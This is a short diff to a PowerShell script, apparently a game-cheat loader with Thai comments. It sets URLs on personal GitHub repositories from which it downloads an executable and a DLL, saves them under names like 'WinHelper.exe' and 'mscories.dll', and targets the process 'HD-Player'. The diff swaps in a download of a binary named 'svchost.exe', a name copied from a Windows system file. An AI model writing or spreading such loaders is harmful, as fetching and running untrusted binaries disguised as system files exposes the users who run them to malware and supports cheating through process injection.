@@ -15,8 +15,7 @@ New-Item -Path $workDir -ItemType Directory -Force | Out-Null
 $exeOutput = Join-Path $workDir "WinHelper.exe"
 $dllOutput = Join-Path $workDir "mscories.dll"
 
-$exeUrl = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
-$dllUrl = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
+$exeUrl = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/svchost.exe"
 $targetProcess = "HD-Player"
 
 # 3. ล้างไฟล์เก่าออกก่อนและดาวน์โหลดไฟล์ใหม่ (ทั้ง EXE และ DLL)
